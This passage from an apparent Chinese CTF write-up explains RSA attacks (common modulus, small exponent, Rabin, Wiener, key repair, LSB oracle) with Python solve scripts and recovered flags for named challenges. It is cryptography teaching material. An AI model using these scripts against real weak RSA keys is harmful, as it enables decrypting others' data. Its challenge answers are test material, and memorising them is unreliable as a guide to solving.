∵gcd(e1,e2)==1,∴由扩展欧几里得算法，存在e1*s1+e2*s2==1</span></span><br><span class="line"><span class="string">    ∴m==m^1==m^(e1*s1+e2*s2)==((m^e1)^s1)*((m^e2)^s2)==(c1^s1)*(c2^s2)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">assert</span> (libnum.gcd(e1, e2) == <span class="number">1</span>)</span><br><span class="line">    _, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class="line">    <span class="comment"># 若s1&lt;0，则c1^s1==(c1^-1)^(-s1)，其中c1^-1为c1模n的逆元。</span></span><br><span class="line">    m = pow(c1, s1, n) <span class="keyword">if</span> s1 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c1, n), -s1, n)</span><br><span class="line">    m *= pow(c2, s2, n) <span class="keyword">if</span> s2 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c2, n), -s2, n)</span><br><span class="line">    <span class="keyword">return</span> m % n</span><br></pre></td></tr></table></figure><h3 id="例子：QCTF2018-XMan选拔赛-Xman-RSA-【共模攻击-模不互素】"><a href="#例子：QCTF2018-XMan选拔赛-Xman-RSA-【共模攻击-模不互素】" class="headerlink" title="例子：QCTF2018-XMan选拔赛 / Xman-RSA 【共模攻击+模不互素】"></a>例子：QCTF2018-XMan选拔赛 / Xman-RSA 【共模攻击+模不互素】</h3><p>这道题利用了共模攻击和模不互素。刚开始是一个字符替换，与本文无关。encryption.encrypted文件被做了字符替换，根据语法确定替换表，修复文件得到源文件如下。</p><p>题目附件见文末链接。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> is_prime</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes_to_num</span><span class="params">(b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(b.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_to_bytes</span><span class="params">(n)</span>:</span></span><br><span class="line">    b = hex(n)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">    b = <span class="string">'0'</span> + b <span class="keyword">if</span> len(b) % <span class="number">2</span> == <span class="number">1</span> <span class="keyword">else</span> b</span><br><span class="line">    <span class="keyword">return</span> b.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_a_prime</span><span class="params">(l)</span>:</span></span><br><span class="line">    random_seed = urandom(l)</span><br><span class="line"></span><br><span class="line">    num = bytes_to_num(random_seed)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> is_prime(num):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(s, e, n)</span>:</span></span><br><span class="line">    p = bytes_to_num(s)</span><br><span class="line">    p = pow(p, e, n)</span><br><span class="line">    <span class="keyword">return</span> num_to_bytes(p).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">separate</span><span class="params">(n)</span>:</span></span><br><span class="line">    p = n % <span class="number">4</span></span><br><span class="line">    t = (p * p) % <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> t == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'flag.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line"></span><br><span class="line">msg1 = <span class="string">""</span></span><br><span class="line">msg2 = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">    <span class="keyword">if</span> separate(i):</span><br><span class="line">        msg2 += flag[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        msg1 += flag[i]</span><br><span class="line"></span><br><span class="line">p1 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p2 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p3 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">n1 = p1 * p2</span><br><span class="line">n2 = p1 * p3</span><br><span class="line">e = <span class="number">0x1001</span></span><br><span class="line">c1 = encrypt(msg1, e, n1)</span><br><span class="line">c2 = encrypt(msg2, e, n2)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">0x1001</span></span><br><span class="line">e2 = <span class="number">0x101</span></span><br><span class="line">p4 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p5 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">n3 = p4 * p5</span><br><span class="line">c1 = num_to_bytes(pow(n1, e1, n3)).encode(<span class="string">'hex'</span>)</span><br><span class="line">c2 = num_to_bytes(pow(n1, e2, n3)).encode(<span class="string">'hex'</span>)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(num_to_bytes(n2)))</span><br><span class="line">print(base64.b64encode(num_to_bytes(n3)))</span><br></pre></td></tr></table></figure><p>n2，n3已知，利用共模攻击得到n1，由<code>gcd(n1,n2)==p1</code>  分解n1，n2，就可解密得到两部分msg，拼接即可。</p><p>解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fix_py</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># decode encryption.encrypted</span></span><br><span class="line">    s1 = <span class="string">'abdefghijklmpqrtuvwxyz'</span></span><br><span class="line">    s2 = <span class="string">'dmenwfoxgpyhirasbktclu'</span></span><br><span class="line">    f1 = open(<span class="string">'encryption.encrypted'</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'encryption.py'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f2:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f1.readlines():</span><br><span class="line">            tmp = <span class="string">''</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">                tmp += s2[s1.index(j)] <span class="keyword">if</span> j <span class="keyword">in</span> s1 <span class="keyword">else</span> j</span><br><span class="line">            f2.write(tmp)</span><br><span class="line"><span class="comment"># fix_py()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">common_modulus</span><span class="params">(n, e1, e2, c1, c2)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> (libnum.gcd(e1, e2) == <span class="number">1</span>)</span><br><span class="line">    _, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class="line">    m = pow(c1, s1, n) <span class="keyword">if</span> s1 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c1, n), -s1, n)</span><br><span class="line">    m *= pow(c2, s2, n) <span class="keyword">if</span> s2 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c2, n), -s2, n)</span><br><span class="line">    m %= n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[n2, n3] = map(<span class="keyword">lambda</span> x: int(base64.b64decode(x).encode(<span class="string">'hex'</span>), <span class="number">16</span>),</span><br><span class="line">               open(<span class="string">'n2&amp;n3'</span>).readlines())</span><br><span class="line">[n1c1, n1c2] = map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), open(<span class="string">'n1.encrypted'</span>).readlines())</span><br><span class="line">[msg1c1, msg2c2] = map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), open(<span class="string">'ciphertext'</span>).readlines())</span><br><span class="line"><span class="comment"># 通过共模攻击得到n1</span></span><br><span class="line">e1 = <span class="number">0x1001</span></span><br><span class="line">e2 = <span class="number">0x101</span></span><br><span class="line">n1 = common_modulus(n3, e1, e2, n1c1, n1c2)</span><br><span class="line"><span class="comment"># n1,n2有一个共有质因数p1</span></span><br><span class="line"><span class="comment"># n1 += n3  # 存在n3比n1小的可能，并且确实如此;貌似主办方中途改题，把n1改成小于n3了。</span></span><br><span class="line">p1 = gmpy2.gcd(n1, n2)</span><br><span class="line"><span class="keyword">assert</span> (p1 != <span class="number">1</span>)</span><br><span class="line">p2 = n1 / p1</span><br><span class="line">p3 = n2 / p1</span><br><span class="line">e = <span class="number">0x1001</span></span><br><span class="line">d1 = gmpy2.invert(e, (p1 - <span class="number">1</span>) * (p2 - <span class="number">1</span>))</span><br><span class="line">d2 = gmpy2.invert(e, (p1 - <span class="number">1</span>) * (p3 - <span class="number">1</span>))</span><br><span class="line">msg1 = pow(msg1c1, d1, n1)</span><br><span class="line">msg2 = pow(msg2c2, d2, n2)</span><br><span class="line">msg1 = hex(msg1)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br><span class="line">msg2 = hex(msg2)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> msg1, msg2</span><br><span class="line"><span class="comment"># XA&#123;RP0I_0Itrsigi s.y</span></span><br><span class="line"><span class="comment"># MNCYT_55_neetnvmrap&#125;</span></span><br><span class="line"><span class="comment"># XMAN&#123;CRYPT0_I5_50_Interestingvim rsa.py&#125;</span></span><br></pre></td></tr></table></figure><h2 id="小明文攻击"><a href="#小明文攻击" class="headerlink" title="小明文攻击"></a>小明文攻击</h2><p><strong>适用情况：e较小，一般为3。</strong> </p><p>公钥e很小，明文m也不大的话，于是<code>m^e=k*n+m</code> 中的的k值很小甚至为0，爆破k或直接开三次方即可。</p><p>Python实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">small_msg</span><span class="params">(e, n, c)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> time.asctime(), <span class="string">"Let's waiting..."</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">200000000</span>):</span><br><span class="line">        <span class="keyword">if</span> gmpy2.iroot(c + n * k, e)[<span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">print</span> time.asctime(), <span class="string">"...done!"</span></span><br><span class="line">            <span class="keyword">return</span> gmpy2.iroot(c + n * k, <span class="number">3</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h3 id="例子：Extremely-hard-RSA"><a href="#例子：Extremely-hard-RSA" class="headerlink" title="例子：Extremely hard RSA"></a>例子：Extremely hard RSA</h3><p>题目提供的n是4096位的，e=3。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,binascii,libnum,time</span><br><span class="line">n=<span class="number">0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929</span></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">res=<span class="number">0</span></span><br><span class="line">c=int(open(<span class="string">'extremelyhardRSA.rar/flag.enc'</span>,<span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> time.asctime()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">200000000</span>):</span><br><span class="line"><span class="keyword">if</span> gmpy2.iroot(c+n*i,<span class="number">3</span>)[<span class="number">1</span>]==<span class="number">1</span>:</span><br><span class="line">res=gmpy2.iroot(c+n*i,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> i,res</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(res)</span><br><span class="line"><span class="keyword">print</span> time.asctime()</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Rabin加密中的N可被分解"><a href="#Rabin加密中的N可被分解" class="headerlink" title="Rabin加密中的N可被分解"></a>Rabin加密中的N可被分解</h2><p><strong>适用情况：e==2</strong> </p><p>Rabin加密是RSA的衍生算法，e==2是Rabin加密典型特征，可以百度或阅读  <a href="https://en.wikipedia.org/wiki/Rabin_cryptosystem" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Rabin_cryptosystem</a>  以了解到详细的说明，这里只关注解密方法。一般先通过其他方法分解得到p，q，然后解密。</p><p>Python实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span><span class="params">(c, p, q, e=<span class="number">2</span>)</span>:</span></span><br><span class="line">    n = p * q</span><br><span class="line">    mp = pow(c, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">    mq = pow(c, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br></pre></td></tr></table></figure><p>函数返回四个数，这其中只有一个是我们想要的明文，需要通过其他方式验证，当然CTF中显然就是flag字眼了。</p><p>解密方法是参照维基百科的，截图如下：</p><p><img src="1531634016545.png" alt="Wiener&#39;s Attack"></p><h3 id="例子：Jarvis-OJ-hard-RSA"><a href="#例子：Jarvis-OJ-hard-RSA" class="headerlink" title="例子：Jarvis OJ hard RSA"></a>例子：Jarvis OJ hard RSA</h3><p>解题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,libnum</span><br><span class="line">n=<span class="number">0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span></span><br><span class="line">p=<span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q=<span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">e=<span class="number">2</span></span><br><span class="line">c=int(open(<span class="string">'hardRSA.rar/flag.enc'</span>,<span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">mp=pow(c,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">mq=pow(c,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">yp=gmpy2.invert(p,q)</span><br><span class="line">yq=gmpy2.invert(q,p)</span><br><span class="line">r=(yp*p*mq+yq*q*mp)%n</span><br><span class="line">rr=n-r</span><br><span class="line">s=(yp*p*mq-yq*q*mp)%n</span><br><span class="line">ss=n-s</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(r)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(rr)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(s)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(ss)</span><br></pre></td></tr></table></figure><h2 id="Wiener’s-Attack"><a href="#Wiener’s-Attack" class="headerlink" title="Wiener’s Attack"></a>Wiener’s Attack</h2><p> <strong>适用情况：e过大或过小。</strong> </p><p>工具：<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">https://github.com/pablocelayes/rsa-wiener-attack</a>  </p><p>在e过大或过小的情况下，可使用算法从e中快速推断出d的值。详细的算法原理可以阅读：<a href="https://www.tr0y.wang/2017/11/06/CTFRSA/index.html#%E4%BD%8E%E8%A7%A3%E5%AF%86%E6%8C%87%E6%95%B0%E6%94%BB%E5%87%BB" target="_blank" rel="noopener">低解密指数攻击</a> 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener_hack</span><span class="params">(e, n)</span>:</span></span><br><span class="line">    <span class="comment"># firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git !</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            discr = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> (discr &gt;= <span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t != <span class="number">-1</span> <span class="keyword">and</span> (s + t) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">"Hacked!"</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure><h3 id="例子：2018强网杯nextrsa-Level2"><a href="#例子：2018强网杯nextrsa-Level2" class="headerlink" title="例子：2018强网杯nextrsa-Level2"></a>例子：2018强网杯nextrsa-Level2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">0x92411fa0c93c1b27f89e436d8c4698bcf554938396803a5b62bd10c9bfcbf85a483bd87bb2d6a8dc00c32d8a7caf30d8899d90cb8f5838cae95f7ff5358847db1244006c140edfcc36adbdcaa16cd27432b4d50d2348b5c15c209364d7914ef50425e4c3da07612cc34e9b93b98d394b43f3eb0a5a806c70f06697b6189606eb9707104a7b6ff059011bac957e2aae9ec406a4ff8f8062400d2312a207a9e018f4b4e961c943dfc410a26828d2e88b24e4100162228a5bbf0824cf2f1c8e7b915efa385efeb505a9746e5d19967766618007ddf0d99525e9a41997217484d64c6a879d762098b9807bee46a219be76941b9ff31465463981e230eecec69691d1L</span></span><br><span class="line">e = <span class="number">0x6f6b385dd0f06043c20a7d8e5920802265e1baab9d692e7c20b69391cc5635dbcaae59726ec5882f168b3a292bd52c976533d3ad498b7f561c3dc01a76597e47cfe60614f247551b3dbe200e2196eaa001a1d183886eeacddfe82d80b38aea24de1a337177683ed802942827ce4d28e20efef92f38f1b1a18c66f9b45f5148cceabfd736de8ac4a49e63a8d35a83b664f9f3b00f822b6f11ff13257ee6e0c00ca5c98e661ea594a9e66f2bd56b33d9a13f5c997e67a37fcf9a0c7f04d119fe1ba261127357e64a4b069aefed3049c1c1fe4f964fd078b88bedd064abea385cfebd65e563f93c12d34eb6426e8aa321033cfd8fe8855b9e74d07fe4f9d70de46fL</span></span><br><span class="line">d = wiener_hack(e, n)</span><br><span class="line"><span class="keyword">print</span> d  <span class="comment">#42043</span></span><br></pre></td></tr></table></figure><h2 id="私钥文件修复"><a href="#私钥文件修复" class="headerlink" title="私钥文件修复"></a>私钥文件修复</h2><p><strong>适用情况：提供破损的私钥文件。</strong> </p><h3 id="例子：Jarvis-OJ-God-Like-RSA"><a href="#例子：Jarvis-OJ-God-Like-RSA" class="headerlink" title="例子：Jarvis OJ-God Like RSA"></a>例子：Jarvis OJ-God Like RSA</h3><p>参考 <a href="https://www.40huo.cn/blog/rsa-private-key-recovery-and-oaep.html" target="_blank" rel="noopener">https://www.40huo.cn/blog/rsa-private-key-recovery-and-oaep.html</a> 修复存储私钥的文件，得到p和q。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,binascii,libnum,time</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'godlikeRSA.rar/pubkey.pem'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.importKey(f)</span><br><span class="line">    n = key.n</span><br><span class="line">    e = key.e</span><br><span class="line">p = <span class="number">30061432003658510087798871614869318011389940352798147030129806359975911392091235344042288409629143229311060231549478211871643725394470760528211801310601767727834886942210718412087541234398453046895030858579989874035849439867334906873642352112428914855967993998732685221108379784833027771293275558876952608462050146340591449046825135890871650866799299533696175818103240024841274114925018619060818213433528894936128306780366785977567327073724428211445259983614467640785163297734447975723664659822673456683284394386723716344090232882990461174301609971805075768328757325956784604364401827152431260896927633163074694121679</span></span><br><span class="line">q = <span class="number">26136662545551829820746942051638228325025130519175536694008242208616774469870765684858288042819063837180243501117310278632509413217676559484513481677689042623348188876598901642459170232360966754692434316796014314498263800234390539118817050074978421973817764644287745302885861277447227180288605200894138168586207384484170481511828680117688324729381172912436910052489279406590356734739774635376711681212908417321705094537960645308009611045658947359297373154395500467689532455017647450616447445444254910371922944620114234547655209970657063715028350418518417105772707885648587233103869340985670430269862943630137067052883</span></span><br><span class="line"><span class="keyword">print</span> n==p*q</span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line"><span class="keyword">print</span> e*d%phi</span><br><span class="line">c=int(open(<span class="string">'godlikeRSA.rar/flag.enc'</span>,<span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span> m</span><br><span class="line"><span class="comment"># 1370223550024951160390505387130177939237950112048472397389773634788136940247048803373180904499220116137720016277614401463947529601059601275191225565163007356175594695217230371190488219356030961008234353281422568670237109241798409859772276203338663213736672988507101836099731545753186306605979236795416523018072994981230167509019379957053839561135207769133885837247551721998502691458955042383536845772871317832519566606644011038158531192089650858814552702073939336587081668849526410118259284356539710136294431275218448114094635426857980426460905608258535404240097392254948848433684475139365021846569436926295331904560877283857331146381104141185386272078892946248648795223866902960499271054375730866146508724739787771837579817109380817612386428775429383894697178101165350212843220568133053034913426083965937819287414427916848075303046293039426388342757953620799736182799948741710617974079729792088434776370340095313622264898772452440870247810948774919910578850614282925852564445288646487485017449052934955175051072066751519784123645584671119185023928739438748519535869994754998423784897445884244844154563303115861175492133906368196005147361767160830004522010287149025190543608485818909441439294996482797249312140402141744752129890112</span></span><br><span class="line"><span class="comment"># 明文是这个，flag是啥不知道</span></span><br></pre></td></tr></table></figure><h2 id="LSB-Oracle-Attack"><a href="#LSB-Oracle-Attack" class="headerlink" title="LSB Oracle Attack"></a>LSB Oracle Attack</h2><p><strong>适用情况：可以选择密文并泄露最低位。</strong> </p><p>在一次RSA加密中，明文为m，模数为n，加密指数为e，密文为c。我们可以构造出<code>c&#39;=((2^e)*c)%n=((2^e)*(m^e))%n=((2*m)^e)%n</code> ， 因为m的两倍可能大于n，所以经过解密得到的明文是 <code>m&#39;=(2*m)%n</code> 。我们还能够知道 